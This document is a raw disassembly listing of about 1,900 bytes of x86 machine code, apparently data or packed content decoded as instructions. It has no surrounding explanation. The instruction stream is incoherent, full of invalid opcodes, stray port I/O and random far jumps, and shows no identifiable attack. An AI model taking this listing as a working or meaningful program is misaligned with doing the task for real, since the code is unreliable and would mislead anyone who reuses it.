  418cc2:	add    BYTE PTR [ebp+0x8],dl
  418cc5:	data16 (bad) 
  418cc7:	adc    dl,dh
  418cc9:	xchg   ebp,ebx
  418ccb:	cmp    eax,0xce4ee6c6
  418cd0:	pop    ebp
  418cd1:	in     eax,dx
  418cd2:	and    BYTE PTR [ecx],dh
  418cd4:	sahf   
  418cd5:	ret    
  418cd6:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cd8:	and    ch,BYTE PTR [eax+0x30bf08a5]
  418cde:	outs   dx,BYTE PTR ds:[esi]
  418cdf:	scas   al,BYTE PTR es:[edi]
  418ce0:	sar    BYTE PTR [esi],1
  418ce2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ce3:	and    edx,eax
  418ce5:	inc    edi
  418ce6:	mov    edi,edx
  418ce8:	(bad)  [ebx]
  418cea:	les    ebp,FWORD PTR [edx+ebp*8-0x79]
  418cee:	xchg   DWORD PTR [edx+0x59],edx
  418cf1:	clc    
  418cf2:	sub    DWORD PTR [eax+0x1a],edi
  418cf5:	mov    ch,0xe
  418cf7:	xor    BYTE PTR [bx+si],dh
  418cfa:	ins    BYTE PTR es:[edi],dx
  418cfb:	es sti 
  418cfd:	adc    DWORD PTR [ecx+0x10235ec8],0xffffffa1
  418d04:	cwde   
  418d05:	push   esi
  418d06:	in     eax,0x45
  418d08:	int3   
  418d09:	xor    esi,DWORD PTR [edx-0xaff3d6e]
  418d0f:	pop    edi
  418d10:	aaa    
  418d11:	pop    esi
  418d12:	pushw  es
  418d14:	inc    edx
  418d15:	cwde   
  418d16:	push   ds
  418d17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d18:	mov    cl,0x6
  418d1a:	adc    BYTE PTR [ebp+0x47529907],al
  418d20:	sbb    edi,ebx
  418d22:	idiv   DWORD PTR [ebx]
  418d24:	jp     0x418d3b
  418d26:	xchg   ecx,eax
  418d27:	mov    WORD PTR [ebx-0x2cbe577c],ds
  418d2d:	jecxz  0x418cc2
  418d2f:	sti    
  418d30:	pop    ss
  418d31:	jne    0x418d44
  418d33:	std    
  418d34:	ins    BYTE PTR es:[edi],dx
  418d35:	imul   esp,DWORD PTR [edi+0x71],0x4b9ee069
  418d3c:	mov    ebp,0x6c883588
  418d41:	into   
  418d42:	inc    ebx
  418d43:	add    edi,DWORD PTR [ebp-0x55]
  418d46:	inc    eax
  418d47:	inc    ebp
  418d48:	test   BYTE PTR [ebp-0x27aee9a2],dh
  418d4e:	adc    DWORD PTR [edi-0x37b56281],ebx
  418d54:	sahf   
  418d55:	add    DWORD PTR [ebx],esp
  418d57:	test   eax,0x8384f238
  418d5c:	dec    edi
  418d5d:	mov    DWORD PTR [esi-0x6a5bcd18],edi
  418d63:	jl     0x418d89
  418d65:	inc    ecx
  418d66:	cmp    eax,0x85090f9e
  418d6b:	call   0x3d5b:0x3a3acd22
  418d72:	arpl   WORD PTR [ebx-0x212cf439],di
  418d78:	adc    al,0xc1
  418d7a:	aas    
  418d7b:	add    eax,0xecb619c7
  418d80:	loopne 0x418dcf
  418d82:	fistp  DWORD PTR [ecx+0x7f7fcd57]
  418d88:	xchg   ebx,eax
  418d89:	lods   al,BYTE PTR ds:[esi]
  418d8a:	dec    edi
  418d8b:	outs   dx,BYTE PTR ds:[esi]
  418d8c:	xor    dh,BYTE PTR [edx+0x1fb020bb]
  418d92:	scas   ax,WORD PTR es:[edi]
  418d94:	add    DWORD PTR [esi+0x19038b27],edi
  418d9a:	push   ss
  418d9b:	push   0xffffffc5
  418d9d:	or     al,0x1d
  418d9f:	cmp    al,dh
  418da1:	mov    ecx,0x3f6220e6
  418da6:	or     ch,BYTE PTR [edx]
  418da8:	mov    esp,0x87356b4b
  418dad:	push   ecx
  418dae:	stc    
  418daf:	punpcklbw mm1,mm1
  418db2:	xchg   edi,eax
  418db3:	addr16 xor cl,dl
  418db6:	inc    DWORD PTR [bx+si+0x31c9]
  418dbb:	sbb    DWORD PTR [eax+0x7a],ecx
  418dbe:	sbb    al,ah
  418dc0:	stc    
  418dc1:	icebp  
  418dc2:	sbb    DWORD PTR [bp-0x32b2],eax
  418dc7:	imul   esi,ebx,0x62
  418dca:	stos   BYTE PTR es:[edi],al
  418dcb:	pop    ss
  418dcc:	outs   dx,DWORD PTR ds:[esi]
  418dcd:	mov    ah,0x1b
  418dcf:	leave  
  418dd0:	cld    
  418dd1:	xchg   edi,eax
  418dd2:	mov    esp,0x29dc5a99
  418dd7:	jbe    0x418dcd
  418dd9:	mov    ebx,0xc1a6686
  418dde:	inc    esi
  418ddf:	or     BYTE PTR [edx],0x60
  418de2:	test   DWORD PTR [esi-0x3d],ecx
  418de5:	in     al,dx
  418de6:	stos   DWORD PTR es:[edi],eax
  418de7:	mov    ecx,0x7374724b
  418dec:	mov    eax,0x3667a542
  418df1:	cs jbe 0x418dfb
  418df4:	jo     0x418d90
  418df6:	add    al,0x54
  418df8:	jg     0x418dda
  418dfa:	pop    ss
  418dfb:	rcl    BYTE PTR [edx],0x61
  418dfe:	jno    0x418d8d
  418e00:	rol    DWORD PTR [edx-0x71],0x19
  418e04:	add    DWORD PTR [edx-0x34],ebx
  418e07:	jbe    0x418e73
  418e09:	push   eax
  418e0a:	add    al,BYTE PTR ds:0xd95072aa
  418e10:	mov    al,ds:0x721ba0eb
  418e15:	in     al,dx
  418e16:	add    eax,0x4053050a
  418e1b:	inc    edi
  418e1c:	aam    0x7d
  418e1e:	out    0x1e,eax
  418e20:	aam    0xdb
  418e22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e23:	dec    ecx
  418e24:	and    eax,0x7c2c6e5a
  418e29:	imul   esi,DWORD PTR [ebp+0x73],0xffffff97
  418e2d:	mov    edx,0x5a53026c
  418e32:	and    al,0xee
  418e34:	jmp    0x9dae:0x3f190f34
  418e3b:	adc    al,0xa2
  418e3d:	xchg   esp,eax
  418e3e:	sti    
  418e3f:	inc    ebp
  418e40:	rcl    ebp,1
  418e42:	pop    ebx
  418e43:	jae    0x418e9f
  418e45:	mov    ecx,0xabf7ff23
  418e4a:	repz (bad)
  418e4d:	and    DWORD PTR [ebx-0x5d02a7f],0xb8de2580
  418e57:	and    eax,0xaac7f801
  418e5c:	lock or cl,BYTE PTR [ecx-0x3f]
  418e60:	xchg   esi,eax
  418e61:	sbb    ah,BYTE PTR [ebx+0x39cebf70]
  418e67:	(bad)  
  418e69:	and    eax,0xd6f0ba88
  418e6e:	mov    bh,0x83
  418e70:	sub    BYTE PTR [edx+edx*8+0x44e0446e],ah
  418e77:	inc    esi
  418e78:	sub    ah,BYTE PTR [edi-0x3def6e9c]
  418e7e:	inc    edi
  418e7f:	lods   eax,DWORD PTR ds:[esi]
  418e80:	pop    esp
  418e81:	fisubr DWORD PTR [edi]
  418e83:	lea    esi,[esi-0x5d]
  418e86:	addr16 pop ds
  418e88:	adc    cl,BYTE PTR [ecx+ecx*4+0x56]
  418e8c:	mov    ?,ecx
  418e8e:	jp     0x418e14
  418e90:	popf   
  418e91:	stos   DWORD PTR es:[edi],eax
  418e92:	inc    edi
  418e93:	mov    ebx,0xe25a3fb8
  418e98:	mov    edx,0x4184c12c
  418e9d:	jns    0x418ea2
  418e9f:	jg     0x418e2c
  418ea1:	or     al,0xf5
  418ea3:	into   
  418ea4:	ds jg  0x418e39
  418ea7:	inc    ecx
  418ea8:	and    DWORD PTR [ebp+0x377261a6],esp
  418eae:	inc    eax
  418eaf:	cvtps2pi mm0,QWORD PTR [eax+0x3eed45a9]
  418eb6:	fisubr WORD PTR [eax+0x15ce9009]
  418ebc:	pop    ebx
  418ebd:	cmp    al,0x40
  418ebf:	and    esi,DWORD PTR [eax]
  418ec1:	loop   0x418ee9
  418ec3:	mov    edx,0x89d038c8
  418ec8:	mov    ds:0xee49e14b,al
  418ecd:	pop    ecx
  418ece:	sbb    dh,BYTE PTR [ebp-0xc]
  418ed1:	xchg   edx,eax
  418ed2:	jae    0x418e93
  418ed4:	xchg   esi,eax
  418ed5:	retfw  0xd80b
  418ed9:	clc    
  418eda:	mov    ecx,0x246846c6
  418edf:	shl    BYTE PTR [edi-0x65978a40],0xf6
  418ee6:	sub    BYTE PTR [esi],ah
  418ee8:	enter  0xfb26,0x6d
  418eec:	cmp    al,0x2b
  418eee:	dec    ecx
  418eef:	mov    ecx,0x52e322ef
  418ef4:	sub    BYTE PTR [edi+0x413a67f6],ah
  418efa:	pop    esp
  418efb:	xchg   ebp,eax
  418efc:	test   eax,0xf6841bed
  418f01:	sbb    esp,DWORD PTR [esi+0xd]
  418f04:	aam    0xe4
  418f06:	sbb    eax,0xe1ac902a
  418f0b:	std    
  418f0c:	out    0x4c,al
  418f0e:	imul   ecx,DWORD PTR [esp],0x1e
  418f12:	ret    0x3239
  418f15:	(bad)  ds:0xe46dcb0
  418f1b:	gs es fs mov bl,0x6d
  418f20:	dec    eax
  418f21:	in     al,0x95
  418f23:	icebp  
  418f24:	adc    DWORD PTR [ecx],esp
  418f26:	inc    esp
  418f27:	push   edi
  418f28:	loopne 0x418ebc
  418f2a:	adc    edx,DWORD PTR [ecx+0x3]
  418f2d:	fdiv   QWORD PTR [ebx+eax*1-0x4a791a10]
  418f34:	mov    esp,0x5d2a7e67
  418f39:	bound  esp,QWORD PTR [ebx-0x3a141eb2]
  418f3f:	loopne 0x418f98
  418f41:	in     eax,dx
  418f42:	vfnmadd231sd xmm2{z},xmm6,QWORD PTR [ebp+0x3c0]
  418f49:	mov    ebx,0xbc172806
  418f4e:	repz mov esi,0xbddfc0f7
  418f54:	adc    esi,DWORD PTR [edi-0x1c66e3b6]
  418f5a:	dec    ebx
  418f5b:	xchg   edx,eax
  418f5c:	int3   
  418f5d:	push   eax
  418f5e:	jmp    0xf547:0x1daf60d
  418f65:	dec    esi
  418f66:	xchg   edi,eax
  418f67:	stos   DWORD PTR es:[edi],eax
  418f68:	mov    edi,0x1cd29664
  418f6d:	jmp    0x9bb3:0x8ac5a068
  418f74:	mov    ch,0xfe
  418f76:	out    0x56,eax
  418f78:	out    dx,al
  418f79:	repz sbb eax,0xbd22a8f3
  418f7f:	aad    0x23
  418f81:	adc    ebx,DWORD PTR [ecx-0x18]
  418f84:	fdivr  DWORD PTR [ebp+0x6aeeb55]
  418f8a:	mov    bh,0xab
  418f8c:	out    dx,al
  418f8d:	push   esi
  418f8e:	loop   0x418fdf
  418f90:	rcr    DWORD PTR [ebp-0x8],cl
  418f93:	jmp    0x418f56
  418f95:	mov    ebx,0xbe70b9e8
  418f9a:	out    0xa0,al
  418f9c:	dec    esp
  418f9d:	pop    ss
  418f9e:	sub    al,0x64
  418fa0:	je     0x418fca
  418fa2:	test   dl,dl
  418fa4:	sub    BYTE PTR [ecx+eiz*2+0x57],0x24
  418fa9:	push   0xffffffdc
  418fab:	jbe    0x418fd3
  418fad:	repz (bad) 
  418faf:	aad    0xc7
  418fb1:	fdivr  DWORD PTR [ebx]
  418fb3:	sahf   
  418fb4:	loop   0x418f97
  418fb6:	mov    BYTE PTR [ecx],cl
  418fb8:	push   cs
  418fb9:	inc    esp
  418fba:	mov    edx,0x619bf87a
  418fbf:	(bad)  
  418fc0:	jns    0x418f9f
  418fc2:	call   0xaa6c:0x5e408b65
  418fc9:	pop    ebp
  418fca:	enter  0xaa0,0xc4
  418fce:	pop    ds
  418fcf:	loop   0x418fef
  418fd1:	std    
  418fd2:	inc    ebx
  418fd3:	xor    eax,0x8a2daa5f
  418fd8:	pop    es
  418fd9:	ds clc 
  418fdb:	add    eax,0x4dfbb29c
  418fe0:	push   esp
  418fe1:	es jns 0x419013
  418fe4:	cli    
  418fe5:	and    al,0xe1
  418fe7:	test   al,0xfd
  418fe9:	popf   
  418fea:	mov    cl,0x4b
  418fec:	push   0xf2304ca5
  418ff1:	pop    ds
  418ff2:	mov    cs,WORD PTR [ecx-0x7b36a0e7]
  418ff8:	push   eax
  418ff9:	mov    al,0x98
  418ffb:	xor    bl,dh
  418ffd:	fimul  DWORD PTR [ebp+0x6d]
  419000:	jb     0x418fdc
  419002:	jmp    0x1b8b:0x1062dd27
  419009:	mov    ebx,0x44258af7
  41900e:	lods   eax,DWORD PTR ds:[esi]
  41900f:	hlt    
  419010:	mov    al,0x48
  419012:	lods   al,BYTE PTR cs:[esi]
  419014:	jmp    0x8eb4:0x562a7c4d
  41901b:	(bad)  
  41901d:	repnz inc bl
  419020:	mov    ecx,0x87fb1182
  419025:	or     eax,0xa966a5d9
  41902a:	xor    BYTE PTR [esi-0x6337c8a4],bh
  419030:	cmp    eax,0xa6e7a095
  419035:	push   ds
  419036:	jmp    0x78fb01dc
  41903b:	aas    
  41903c:	ret    
  41903d:	jle    0x419089
  41903f:	nop
  419040:	cli    
  419041:	in     eax,0xfb
  419043:	lods   al,BYTE PTR ds:[esi]
  419044:	idiv   DWORD PTR [ecx+0x62]
  419047:	sbb    esp,DWORD PTR [edx-0x3c]
  41904a:	repnz fimul WORD PTR [edi-0x398cd3fe]
  419051:	inc    ebp
  419052:	mov    WORD PTR [eax+0x7d],ds
  419055:	out    dx,eax
  419056:	test   DWORD PTR [eax+ecx*2-0x3a],esi
  41905a:	sbb    al,0x94
  41905c:	das    
  41905d:	cld    
  41905e:	aas    
  41905f:	or     BYTE PTR [ebp-0x1e4dddc2],0x8b
  419066:	fild   WORD PTR [ebp-0x1]
  419069:	dec    edx
  41906a:	outs   dx,BYTE PTR ds:[esi]
  41906b:	dec    esp
  41906c:	mov    cs,esp
  41906e:	sub    ah,dh
  419070:	cs pop ss
  419072:	(bad)  
  419073:	mov    WORD PTR [edi+edi*4-0x69ed015f],?
  41907a:	jo     0x41903c
  41907c:	popa   
  41907d:	jecxz  0x419022
  41907f:	or     ebp,DWORD PTR [edx+0x6f]
  419082:	cld    
  419083:	lods   al,BYTE PTR ds:[esi]
  419084:	push   0xcf18487e
  419089:	mov    ecx,0x810934fb
  41908e:	repz dec eax
  419090:	xchg   esi,eax
  419091:	(bad)  
  419092:	repz mov bh,0xf1
  419095:	das    
  419096:	retf   0x458
  419099:	out    0xbf,eax
  41909b:	jmp    0x4190ee
  41909d:	call   0x74dc:0xf01cddd9
  4190a4:	sbb    BYTE PTR [ebp+0x3c],dh
  4190a7:	dec    eax
  4190a8:	sbb    BYTE PTR [ebp-0x3393f7cb],bl
  4190ae:	jge    0x4190bf
  4190b0:	pop    es
  4190b1:	out    dx,eax
  4190b2:	and    ebp,DWORD PTR [eax]
  4190b4:	rcl    DWORD PTR [ebx+0x6e2641f3],cl
  4190ba:	jns    0x4190fe
  4190bc:	inc    esi
  4190bd:	(bad)
  4190c1:	cld    
  4190c2:	ins    BYTE PTR es:[edi],dx
  4190c3:	mov    edx,0xf4b4b77e
  4190c8:	pop    ds
  4190c9:	ds jno 0x419078
  4190cc:	mov    ds:0xeb083620,eax
  4190d1:	repz je 0x419077
  4190d4:	jmp    0x419127
  4190d6:	das    
  4190d7:	or     ebp,DWORD PTR [edx]
  4190d9:	pop    ds
  4190da:	leave  
  4190db:	sbb    eax,0x34e07456
  4190e0:	jl     0x4190b9
  4190e2:	inc    ecx
  4190e3:	fsubr  DWORD PTR [ebx-0x4d]
  4190e6:	repz jmp 0x37db6858
  4190ec:	ficom  WORD PTR [edi-0x42]
  4190ef:	dec    eax
  4190f0:	dec    ebp
  4190f1:	or     edx,DWORD PTR [eax]
  4190f3:	sbb    eax,0xdc7c1572
  4190f8:	mov    bl,0xe
  4190fa:	sub    al,0xf7
  4190fc:	out    dx,al
  4190fd:	jmp    DWORD PTR [eax]
  4190ff:	outs   dx,BYTE PTR ds:[esi]
  419100:	inc    ebp
  419101:	scas   al,BYTE PTR es:[edi]
  419102:	shr    esi,cl
  419104:	jecxz  0x419161
  419106:	es inc ebp
  419108:	hlt    
  419109:	rcr    BYTE PTR ds:0x9cdbc9e3,cl
  41910f:	cmp    BYTE PTR ds:[edx-0x6389cb31],ah
  419116:	int3   
  419117:	and    eax,0xa0e3ed6c
  41911c:	iret   
  41911d:	in     al,dx
  41911e:	and    BYTE PTR [edx-0x43],ah
  419121:	cmp    DWORD PTR [ebp-0x40],esp
  419124:	sub    esp,ebp
  419126:	push   cs
  419127:	out    0xee,al
  419129:	add    ecx,DWORD PTR [ecx]
  41912b:	add    bh,dh
  41912d:	(bad)  
  41912e:	nop
  41912f:	jge    0x419180
  419131:	push   ss
  419132:	pop    es
  419133:	push   ds
  419134:	sbb    BYTE PTR [edx+0x13899ef0],dh
  41913a:	inc    esi
  41913b:	mov    DWORD PTR [edi-0x3],edi
  41913e:	stos   BYTE PTR es:[edi],al
  41913f:	mov    al,0x6c
  419141:	pusha  
  419142:	not    BYTE PTR [esi-0xfe87b5e]
  419148:	and    DWORD PTR [ecx],0xffffffb4
  41914b:	xchg   BYTE PTR [ebx],dh
  41914d:	(bad)  
  41914e:	or     ebx,eax
  419150:	bnd jne 0x4190d3
  419153:	pop    edi
  419154:	gs xchg ecx,eax
  419157:	fmul   DWORD PTR [esi-0x68]
  41915a:	stos   DWORD PTR es:[edi],eax
  41915b:	pusha  
  41915c:	and    eax,0xebfa4df7
  419161:	adc    ah,dh
  419163:	iret   
  419164:	pop    edx
  419165:	in     eax,0xc5
  419167:	or     eax,DWORD PTR [ebp-0x6e]
  41916a:	fcomp  QWORD PTR [edx+0xd0ba580]
  419170:	fs push 0xec6a5d2d
  419176:	push   edx
  419177:	fwait
  419178:	cmp    eax,0xe1a3c96e
  41917d:	sub    bl,bl
  41917f:	(bad)  
  419180:	add    eax,0xe580d98
  419185:	pop    esp
  419186:	pop    eax
  419187:	daa    
  419188:	lock pop esp
  41918a:	push   cs
  41918b:	xor    cl,dl
  41918d:	mov    dh,0xdd
  41918f:	add    eax,0xc46f7d33
  419194:	push   esi
  419195:	daa    
  419196:	daa    
  419197:	in     eax,dx
  419198:	jb     0x4191af
  41919a:	gs pop edx
  41919c:	mov    ebp,0xc7dfd1f9
  4191a1:	or     ebp,ebp
  4191a3:	out    0xfa,al
  4191a5:	xchg   esp,eax
  4191a6:	pop    esp
  4191a7:	jg     0x4191be
  4191a9:	xchg   esi,eax
  4191aa:	std    
  4191ab:	dec    eax
  4191ac:	mov    al,0x54
  4191ae:	retf   
  4191af:	shr    cl,0x13
  4191b2:	popf   
  4191b3:	cmp    ah,bl
  4191b5:	or     BYTE PTR [eax+0x78100c54],dh
  4191bb:	call   0x266c4077
  4191c0:	dec    edi
  4191c1:	jnp    0x419190
  4191c3:	test   eax,0xfd36a9b6
  4191c8:	inc    esp
  4191c9:	dec    eax
  4191ca:	add    ebx,ebp
  4191cc:	xor    eax,0xff7ec0c
  4191d1:	cmpxchg8b QWORD PTR [ebx]
  4191d4:	and    al,0xcb
  4191d6:	dec    edx
  4191d7:	push   ds
  4191d8:	jmp    0xab9c2947
  4191dd:	leave  
  4191de:	lea    edi,[eax]
  4191e0:	or     DWORD PTR [ebp+0x9],eax
  4191e3:	xchg   edi,eax
  4191e4:	cmp    BYTE PTR [edx+eiz*2],0x4f
  4191e8:	add    edx,DWORD PTR ds:0x8bc09f4b
  4191ee:	shr    esp,1
  4191f0:	add    DWORD PTR [eax-0x7dd6d121],0xeaf3a962
  4191fa:	retf   0x23c3
  4191fd:	dec    eax
  4191fe:	add    bh,ch
  419200:	xchg   esi,eax
  419201:	inc    eax
  419202:	fisub  DWORD PTR [eax-0x2806bd60]
  419208:	push   0x75dc5d6b
  41920d:	shl    BYTE PTR [esi-0x1735db09],1
  419213:	jp     0x419232
  419215:	mov    BYTE PTR [edx+edi*4],bh
  419218:	add    al,0x47
  41921a:	fwait
  41921b:	sub    al,0xa5
  41921d:	cmp    BYTE PTR [ebx-0x1b47f902],0x7d
  419224:	fwait
  419225:	dec    esi
  419226:	jmp    0xb457119d
  41922b:	cmp    DWORD PTR [eax-0x23],esi
  41922e:	ret    
  41922f:	icebp  
  419230:	data16 sub bh,BYTE PTR [esi]
  419233:	xchg   edx,eax
  419234:	(bad)  
  419236:	mov    esp,DWORD PTR [ecx]
  419238:	test   DWORD PTR [eax-0x19110721],esi
  41923e:	push   0xffffffdc
  419240:	sahf   
  419241:	fistp  QWORD PTR [ebp+0x6ad4bbea]
  419247:	ja     0x4191e1
  419249:	sbb    BYTE PTR [esi],0x24
  41924c:	push   edi
  41924d:	mov    edx,0x6f989e9f
  419252:	pop    edi
  419253:	loope  0x4191e5
  419255:	sbb    BYTE PTR [edx+ecx*2+0x3b],dh
  419259:	addr16 mov dh,0x96
  41925c:	loop   0x419209
  41925e:	fmul   DWORD PTR [edx+0x4b73b0]
  419264:	cmp    DWORD PTR [esi],ebx
  419266:	leave  
  419267:	jns    0x4192d7
  419269:	outs   dx,BYTE PTR ds:[esi]
  41926a:	test   eax,0x4c535fc3
  41926f:	retf   
  419270:	ret    0xb5ae
  419273:	mov    cl,0x81
  419275:	in     eax,dx
  419276:	imul   esi,esp,0x277a422f
  41927c:	dec    ebp
  41927d:	stos   DWORD PTR es:[edi],eax
  41927e:	hlt    
  41927f:	shl    ah,cl
  419281:	aam    0xff
  419283:	sub    al,0xf3
  419285:	xchg   edx,eax
  419286:	fmul   st,st(7)
  419288:	ja     0x4192ed
  41928a:	jmp    0x1ec720f8
  41928f:	ins    BYTE PTR es:[edi],dx
  419290:	add    ebx,0xffffffea
  419293:	imul   edx,DWORD PTR [edx],0xcda39043
  419299:	mov    esp,0xed26fcbb
  41929e:	outs   dx,BYTE PTR ds:[esi]
  41929f:	int    0x1c
  4192a1:	push   ds
  4192a2:	add    dh,BYTE PTR [ecx+0x2d]
  4192a5:	repz mov esp,0xd09d073c
  4192ab:	adc    al,0x9
  4192ad:	out    0x8a,al
  4192af:	das    
  4192b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192b1:	fld    QWORD PTR [esi]
  4192b3:	loop   0x419303
  4192b5:	add    eax,esp
  4192b7:	sbb    ah,bh
  4192b9:	mov    ch,0x72
  4192bb:	shr    ah,cl
  4192bd:	jp     0x4192d7
  4192bf:	or     eax,0x6a7b80a1
  4192c4:	scas   al,BYTE PTR es:[edi]
  4192c5:	imul   si,WORD PTR [ecx-0x65],0xb899
  4192cb:	push   ds
  4192cc:	mov    dl,0x7a
  4192ce:	cmp    bl,bl
  4192d0:	cs fsub st,st(3)
  4192d3:	sti    
  4192d4:	xchg   edx,eax
  4192d5:	push   edx
  4192d6:	and    BYTE PTR [edx+edx*8+0x79f4e53b],cl
  4192dd:	mov    WORD PTR [ebx+0x30b8bc8d],es
  4192e3:	jo     0x41929a
  4192e5:	push   ebp
  4192e6:	fimul  DWORD PTR [edi-0x60125cad]
  4192ec:	pop    es
  4192ed:	mov    al,ch
  4192ef:	cmp    esi,ebp
  4192f1:	dec    ecx
  4192f2:	imul   ebx,DWORD PTR [ebp+0x24],0x5bd869a0
  4192f9:	loop   0x4192fd
  4192fb:	mov    al,ds:0x6b3c53e
  419300:	xlat   BYTE PTR ds:[ebx]
  419301:	and    esp,DWORD PTR [ecx-0x7cd28366]
  419307:	xor    al,0x4c
  419309:	add    eax,0x76457c4e
  41930e:	cmc    
  41930f:	or     bh,BYTE PTR [edi]
  419311:	fisub  DWORD PTR [esp+edi*4-0x2a]
  419315:	push   0x7d
  419317:	sub    al,dl
  419319:	adc    eax,0xe636244
  41931e:	xchg   esp,eax
  41931f:	ret    0x8f33
  419322:	xchg   ebx,esp
  419324:	and    dl,BYTE PTR [ebx-0x7fa07499]
  41932a:	add    ecx,DWORD PTR [ebx+0x1c]
  41932d:	arpl   bp,bp
  41932f:	cmp    eax,eax
  419331:	imul   edi,ebp,0xbf74b395
  419337:	call   0x2634662b
  41933c:	(bad)  
  41933d:	cmc    
  41933e:	pop    esi
  41933f:	or     dl,BYTE PTR [esi-0x66]
  419342:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419343:	sub    DWORD PTR [edx+0x1a65e9b7],eax
  419349:	adc    DWORD PTR [esi+edi*8+0x4fbcc23d],0xa92f94fa
  419354:	pop    ebx
  419355:	mov    bl,0xbe
  419357:	xor    esi,DWORD PTR ds:[ebp-0x64]
  41935b:	bound  edi,QWORD PTR [edi]
  41935d:	fs mov edi,ds
  419360:	outs   dx,DWORD PTR ds:[esi]
  419361:	out    0x95,al
  419363:	add    eax,0xbdcad46
  419368:	xchg   esp,eax
  419369:	lds    esp,FWORD PTR [ebx+0x2f]
  41936c:	in     eax,dx
  41936d:	ds cmp al,0x33
  419370:	retf   0x7fca
  419373:	xchg   edx,eax
  419374:	jp     0x4193f1
  419376:	jne    0x419330
  419378:	outs   dx,DWORD PTR ds:[esi]
  419379:	(bad)
  41937c:	maskmovq mm4,(bad)
  41937d:	mul    DWORD PTR [esi+ecx*2-0x604d0c2f]
  419384:	jp     0x4193fd
  419386:	pushf  
  419387:	outs   dx,DWORD PTR ds:[esi]
  419388:	imul   edi,ebp,0xffffffce
  41938b:	in     al,dx
  41938c:	js     0x419375
  41938e:	mov    esi,0xe1538faa
  419393:	mov    ch,0xc3
  419395:	jecxz  0x4193ed
  419397:	outs   dx,DWORD PTR ds:[esi]
  419398:	xor    al,0xcd
  41939a:	xor    eax,0x485ed144
  41939f:	loope  0x4193c4
  4193a1:	mov    eax,ds:0x593cbe3a
  4193a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193a7:	or     bl,dl
  4193a9:	or     DWORD PTR [ebp-0x354d4a07],ebp
  4193af:	push   0xffffff9f
  4193b1:	lds    ebx,FWORD PTR [edx]
  4193b3:	repnz adc edi,DWORD PTR fs:[edi+0x1eec6fe]
  4193bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193bc:	stc    
  4193bd:	xor    al,0xec
  4193bf:	je     0x419421
  4193c1:	arpl   WORD PTR [ebx+0x54],dx
  4193c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193c5:	lahf   
  4193c6:	loopne 0x41936a
  4193c8:	mov    edi,DWORD PTR [esi-0x6a]
  4193cb:	jl     0x4193ee
  4193cd:	(bad)  
  4193ce:	mov    esi,0xd56a9e46
  4193d3:	clc    
  4193d4:	je     0x41943a
  4193d6:	inc    edi
  4193d7:	dec    edx
  4193d8:	mov    al,0x6
  4193da:	push   cs
  4193db:	call   0xd014f5cf
  4193e0:	cdq    
  4193e1:	(bad)
  4193e5:	(bad)  
  4193e6:	xchg   edi,eax
  4193e7:	fsub   DWORD PTR [ebx+0x3102c67f]
  4193ed:	jns    0x41944a
  4193ef:	in     eax,dx
  4193f0:	test   DWORD PTR [ecx-0x2a],0xa990dd88
  4193f7:	hlt    
  4193f8:	les    esi,FWORD PTR [esi]
  4193fa:	imul   DWORD PTR [ebx+ebp*1]
  4193fd:	(bad)  
  4193fe:	push   cs
  4193ff:	fidiv  WORD PTR [ebp-0x4a]
  419402:	icebp  
  419403:	push   ss
  419404:	test   al,0x10
  419406:	or     DWORD PTR [edi+0x51362475],ecx
  41940c:	mov    ebx,0xfd08443e
  419411:	inc    ebx
  419412:	pop    ebp
  419413:	int3   
  419414:	fwait
  419415:	nop
  419416:	xchg   DWORD PTR [eax],ebp
  419418:	cld    
  419419:	push   eax
  41941a:	jne    0x4193b2
  41941c:	add    ah,cl
  41941e:	cli    
  41941f:	ret    
  419420:	or     BYTE PTR ds:0x95f645a9,al
  419426:	mov    esi,0xc5e603e1
  41942b:	push   es
  41942c:	pop    esp
  41942d:	mov    esp,0x4eedde4f
  419432:	xchg   edx,eax
  419433:	fwait
  419434:	mov    WORD PTR [esi+0x3c],?
  419437:	push   edi
  419438:	inc    esi
  419439:	mov    ebp,0x15600c13
  41943e:	data16 rcr BYTE PTR [esi+ecx*2-0x7e],1
  419443:	in     al,dx
  419444:	jo     0x4194c1
  419446:	mov    ebp,ebx
  419448:	ds sub dh,ch
  41944b:	es inc ebx
  41944d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41944e:	and    DWORD PTR [ecx],edi
  419450:	cld    
  419451:	pop    ds
  419452:	mov    edi,0x7ad7623
  419457:	xor    eax,0x187a94ed
  41945c:	repnz mov esi,0xee1ecbaa
  419462:	jmp    0x4194a3
  419464:	jno    0x4194e4
  419466:	and    ecx,DWORD PTR [edi]
  419468:	ficom  WORD PTR [ebx]
  41946a:	cmp    eax,0xdf12cf00
  41946f:	mov    ebx,0x65157f01
  419474:	daa    
  419475:	js     0x419447
  419477:	adc    ch,BYTE PTR [ecx]
  419479:	arpl   WORD PTR [edi+0x6],cx
  41947c:	adc    eax,0xf320828d
  419481:	ss mov bl,0x76
  419484:	popf   
  419485:	fnsave [ebx+0x3a5333e5]
  41948b:	adc    al,0x79
  41948d:	in     al,0x67
  41948f:	cmp    eax,0x2b2d4406
  419494:	lahf   
  419495:	jecxz  0x419508
  419497:	jne    0x41944a
  419499:	push   0xfffffffd
  41949b:	fisubr DWORD PTR [ecx-0x2d54e69d]
  4194a1:	loop   0x419450
  4194a3:	xor    esi,DWORD PTR [ebp-0x1015b28]
  4194a9:	and    al,0xd8
  4194ab:	sbb    al,0xa9
  4194ad:	adc    dh,al
  4194af:	cmp    BYTE PTR [eax+eiz*2-0x69],ah
  4194b3:	push   ecx
  4194b4:	pop    ds
  4194b5:	out    dx,eax
  4194b6:	sub    bh,BYTE PTR [ebx]
  4194b8:	adc    eax,0xecb3777f
  4194bd:	dec    esi
  4194be:	pop    ebp
  4194bf:	jnp    0x41946d
  4194c1:	idiv   BYTE PTR [edx+0x688ac134]
  4194c7:	(bad)  
  4194c8:	call   0x948c271d
  4194cd:	sbb    eax,0x1c7bd83d
  4194d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4194d3:	inc    ebx
  4194d4:	mov    cl,BYTE PTR [ebx-0x6a452952]
